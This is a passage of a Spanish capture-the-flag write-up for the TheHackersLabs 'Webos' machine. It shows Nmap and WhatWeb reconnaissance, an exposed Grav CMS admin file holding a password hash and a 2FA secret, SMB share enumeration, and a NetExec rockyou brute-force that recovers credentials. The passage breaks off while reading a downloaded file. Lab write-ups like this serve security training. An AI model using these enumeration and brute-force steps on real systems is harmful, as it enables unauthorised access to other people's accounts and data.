<!doctype html><html lang=es><head><title>THL Webos WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="TheHackersLabs 'Webos' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="THL Webos WriteUp"><meta name=twitter:description content="TheHackersLabs 'Webos' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/webos/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="THL Webos WriteUp"><meta property="og:description" content="TheHackersLabs 'Webos' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-16T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-16T00:00:00+00:00"><meta property="article:tag" content="THL"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Rce"><meta property="article:tag" content="Python"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/webos/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/webos/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/webos/>THL Webos WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-16T00:00:00Z>16 septiembre, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
16 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/thl/>THL</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/rce/>Rce</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/python/>Python</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/grave-cms/>Grave Cms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/gtfobins/>Gtfobins</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/capabilities/>Capabilities</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/whatweb/>Whatweb</a></span></div></div></header><div class=post-content><h1 id=webos----thehackerslabs>Webos &ndash; TheHackersLabs
<a class=heading-link href=#webos----thehackerslabs><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>TheHackersLabs</em></li></ul><p><img alt="&lsquo;TheHackersLabs&rsquo; Avatar" src=/pentesting/images/TheHackersLabs_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Webos&rdquo; es una m√°quina de dificultad f√°cil de la plataforma <code>TheHackersLabs</code>. Luego de una inspecci√≥n inicial, vemos que la m√°quina est√° corriendo <code>Samba</code>. Dado que esta m√°quina permite autenticaci√≥n como usuario <code>guest</code>, somos capaces de encontrar credenciales por fuerza bruta para un usuario en este servicio. Dentro de este servicio, somos capaces de encontrar y decodificar un archivo el cual tiene credenciales para un panel de administraci√≥n del gestor de contenido <code>Grav CMS</code>. Ya dentro, somos capaces de ejecutar c√≥digo remoto utilizando la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a> y ganar as√≠ acceso inicial a la m√°quina v√≠ctima. Una vez dentro, somos capaces de encontrar un archivo <code>Python</code> el cual tiene capabilities, lo que nos permite escalar privilegios al usuario <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezamos enviando un <code>ping</code> a la m√°quina v√≠ctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ping -c1 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PING 10.20.1.128 (10.20.1.128) 56(84) bytes of data.
</span></span></span><span class=line><span class=cl><span class=go>64 bytes from 10.20.1.128: icmp_seq=1 ttl=64 time=2.73 ms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--- 10.20.1.128 ping statistics ---
</span></span></span><span class=line><span class=cl><span class=go>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span></span></span><span class=line><span class=cl><span class=go>rtt min/avg/max/mdev = 2.727/2.727/2.727/0.000 ms
</span></span></span></code></pre></div><p>Basados en su <code>TTL</code>, podemos suponer que estamos ante una m√°quina <code>Linux</code>.</p><p>Buscamos entonces por puertos <code>TCP</code> abiertos en esta m√°quina usando <code>Nmap</code> corriendo el comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 15:53 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 15:53
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.128 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 15:53, 0.07s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 15:53
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.128 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 22/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 139/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 445/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 15:53, 2.73s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00031s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-09-05 15:53:50 -04 for 3s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65531 closed tcp ports (reset)
</span></span></span><span class=line><span class=cl><span class=go>PORT    STATE SERVICE      REASON
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh          syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http         syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>139/tcp open  netbios-ssn  syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>445/tcp open  microsoft-ds syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:90:20:B8 (Oracle VirtualBox virtual NIC)
</span></span></span></code></pre></div><p>Del escaneo podemos ver 4 puertos abiertos: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code>, <code>139</code> <code>NetBios</code> y <code>445</code> <code>Server Message Block</code> (<code>SMB</code>). Aplicando adem√°s algunos escaneos de reconocimiento y versiones con la flag <code>-sVC</code> ante estos puertos, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,139,445 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 15:59 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00036s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE     VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 d1:ab:7b:af:5c:3b:5e:52:23:9a:97:57:a8:aa:a1:f5 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 73:d9:ad:9e:c0:96:12:d8:ed:1b:ee:c0:15:ba:34:98 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http        Apache httpd 2.4.59 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-generator: GravCMS
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: webos.thl | Grav
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.59 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>| http-robots.txt: 13 disallowed entries
</span></span></span><span class=line><span class=cl><span class=go>| /.github/ /.phan/ /assets/ /backup/ /bin/ /cache/ /logs/
</span></span></span><span class=line><span class=cl><span class=go>|_/system/ /tests/ /tmp/ /user/ /vendor/ /webserver-configs/
</span></span></span><span class=line><span class=cl><span class=go>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: THE HACKERS LABS - WEBOS)
</span></span></span><span class=line><span class=cl><span class=go>445/tcp open  netbios-ssn Samba smbd 4.17.12-Debian (workgroup: THE HACKERS LABS - WEBOS)
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:90:20:B8 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: THEHACKERSLABS-WEBOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-09-05T20:00:00
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   account_used: guest
</span></span></span><span class=line><span class=cl><span class=go>|   authentication_level: user
</span></span></span><span class=line><span class=cl><span class=go>|   challenge_response: supported
</span></span></span><span class=line><span class=cl><span class=go>|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class=line><span class=cl><span class=go>|_nbstat: NetBIOS name: , NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span></span></span><span class=line><span class=cl><span class=go>| smb-os-discovery:
</span></span></span><span class=line><span class=cl><span class=go>|   OS: Windows 6.1 (Samba 4.17.12-Debian)
</span></span></span><span class=line><span class=cl><span class=go>|   Computer name: thehackerslabs-webos
</span></span></span><span class=line><span class=cl><span class=go>|   NetBIOS computer name: THEHACKERSLABS-WEBOS\x00
</span></span></span><span class=line><span class=cl><span class=go>|   Domain name:
</span></span></span><span class=line><span class=cl><span class=go>|   FQDN: thehackerslabs-webos
</span></span></span><span class=line><span class=cl><span class=go>|_  System time: 2024-09-05T22:00:00+02:00
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -1s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 32.30 seconds
</span></span></span></code></pre></div><p>Como se esperaba, <code>NetBios</code> y <code>Server Message Block|SMB</code> son servicios para m√°quinas basadas en sistema operativo <code>Windows</code>, pero al estar corriendo en <code>Linux</code> √©sta se encuentra usando el servicio <code>Samba</code>.</p><p>Si realizamos un escaneo con la herramienta <code>WhatWeb</code> contra el sitio web <code>HTTP</code> de la m√°quina v√≠ctima, obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a 3 http://10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.128 [200 OK] Apache[2.4.59], Cookies[grav-site-40d1b2d], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], HttpOnly[grav-site-40d1b2d], IP[10.20.1.128], JQuery, MetaGenerator[GravCMS], PasswordField[password], Script, Title[webos.thl | Grav], X-UA-Compatible[IE=edge]
</span></span></span></code></pre></div><p>De donde podemos ver que estamos ante un servicio corriendo <code>Grav CMS</code>. Buscando en Google <code>what is grav</code> (<code>qu√© es grav?</code>) encontramos <a href=https://getgrav.org/ class=external-link target=_blank rel=noopener>su p√°gina web oficial</a>, donde proveen una descripci√≥n para este software:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>Grav</code> is a modern, Crazy Fast, Ridiculously Easy and Powerful Flat-File <code>Content Management System</code>.</div></div><p>B√°sicamente, <code>Grav CMS</code> es un <code>Content Management System</code> (<code>CMS</code>) como lo podr√≠a ser <code>WordPress</code> o <code>Joomla</code>.</p><p>Visitando el sitio web (<code>http://10.20.1.128</code> en nuestro caso) muestra un panel de login:</p><p><img alt="Webos 1" src=/pentesting/images/Webos_1.png></p><p>Decidimos revisar algunos archivos que se muestran en <code>/robots.txt</code>, pero no hallamos nada interesante de momento. De manera que volveremos a este sitio web m√°s tarde.</p><p>Basados en la <a href=https://learn.getgrav.org/17/admin-panel/introduction#creating-a-user class=external-link target=_blank rel=noopener>documentaci√≥n de Grav CMS</a>, cuando creamos un usuario su data es almacenada en la ruta <code>/user/accounts</code>. Revisamos si este directorio existe a trav√©s de <code>cURL</code> en una terminal:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.128/user/accounts/ | html2text
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****** Index of /user/accounts ******
</span></span></span><span class=line><span class=cl><span class=go>`ICO`       Name             Last modified    Size Description
</span></span></span><span class=line><span class=cl><span class=go>===========================================================================
</span></span></span><span class=line><span class=cl><span class=go>`PARENTDIR` Parent Directory ¬†                   - ¬†
</span></span></span><span class=line><span class=cl><span class=go>`   `       admin.yaml       2024-07-06 14:18  362 ¬†
</span></span></span><span class=line><span class=cl><span class=go>===========================================================================
</span></span></span><span class=line><span class=cl><span class=go>     Apache/2.4.59 (Debian) Server at 10.20.1.128 Port 80
</span></span></span></code></pre></div><p>Encontramos un archivo en la ruta <code>http://10.20.1.128/user/accounts/admin.yaml</code>.</p><p>Si revisamos este archivo tenemos informaci√≥n:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>state</span><span class=p>:</span><span class=w> </span><span class=l>enabled</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>email</span><span class=p>:</span><span class=w> </span><span class=l>admin@thehackerslabs.com</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>fullname</span><span class=p>:</span><span class=w> </span><span class=l>TheHackersLabs</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>title</span><span class=p>:</span><span class=w> </span><span class=l>Administrator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>hashed_password</span><span class=p>:</span><span class=w> </span><span class=l>$2y$10$F0k5Ajn42KuhpoAN3Y7FXevY5W2MKHQpwpCKg7EzDxlayLD.iwVJC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>language</span><span class=p>:</span><span class=w> </span><span class=l>es</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>content_editor</span><span class=p>:</span><span class=w> </span><span class=l>default</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>twofa_enabled</span><span class=p>:</span><span class=w> </span><span class=kc>false</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>twofa_secret</span><span class=p>:</span><span class=w> </span><span class=l>NVNYOYB5IL3NPUKKRX4E6BPCTRWRQNFQ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>avatar</span><span class=p>:</span><span class=w> </span>{<span class=w>  </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>access</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>site</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>login</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>admin</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>login</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>super</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span></code></pre></div><p>Donde podemos ver un hash. Tratamos de crackearlo, pero no tenemos √©xito.</p><p>Ya en este punto decidimos ir por el servicio <code>SMB</code>. Basados en el output del escaneo de <code>Nmap</code>, podemos ver que nos podemos loguear como el usuario <code>guest</code> en este servicio. Si usamos la herramienta <code>NetExec</code> para ver, adem√°s, qu√© recursos compartidos podemos ver, obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u guest -p &#39;&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\guest:
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS print$                          Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS webos                           Archivo compartido en Samba
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS IPC$                            IPC Service (Samba 4.17.12-Debian)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS nobody                          Home Directories
</span></span></span></code></pre></div><p>Donde podemos ver 2 recursos compartidos que no son por defecto: <code>webos</code> y <code>nobody</code>.</p><p>Podemos entonces usar <code>NetExec</code> para performar un ataque de <code>Brute Force Password Login</code> (Logueo con contrase√±a por Fuerza Bruta). Si uno de los recursos fuera un acceso al directorio <code>/home</code>, esto podr√≠a significar que existe un usuario <code>webos</code> y/o <code>nobody</code> (pero este √∫ltimo usuario viene por defecto en algunos servicios, de manera que me lo saltar√© de momento):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u &#39;webos&#39; -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:123456 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:12345 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:father STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:77777 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\webos:geraldine
</span></span></span></code></pre></div><p>y obtenemos credenciales: <code>webos:geraldine</code>.</p><p>Revisando cu√°les son los recursos que este usuario puede leer, tenemos 2:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; --shares --filter-shares READ WRITE
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\webos:geraldine
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS print$          READ            Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS webos           READ            Archivo compartido en Samba
</span></span></span></code></pre></div><p>donde <code>webos</code> se ve interesante.</p><p>Observando qu√© es lo que hay dentro del recurso compartido <code>webos</code> con la herramienta <code>smbmap</code> muestra un archivo <code>.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; -r &#39;webos&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 10.20.1.128:445 Name: 10.20.1.128               Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        print$                                                  READ ONLY       Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>        webos                                                   READ ONLY       Archivo compartido en Samba
</span></span></span><span class=line><span class=cl><span class=go>        ./webos
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed Jul 17 14:47:07 2024    .
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Thu Jul 18 05:31:55 2024    ..
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--              245 Wed Jul 17 14:47:07 2024    Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
</span></span></span></code></pre></div><p>Podemos entonces usar <code>smbmap</code> nuevamente para descargar este archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; --download &#39;webos/Mama√ëema.txt&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting download: webos\Mama√ëema.txt (245 bytes)
</span></span></span><span class=line><span class=cl><span class=go>[+] File output to: /home/gunzf0x/OtherMachines/TheHackersLabs/Webos/content/10.20.1.128-webos_Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go>[*] Closed 1 connections
</span></span></span></code></pre></div><p>Leyendo el contenido de este archivo, vemos que √©ste podr√≠a estar en lenguaje conocido como <code>Brainfuck</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat 10.20.1.128-webos_Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
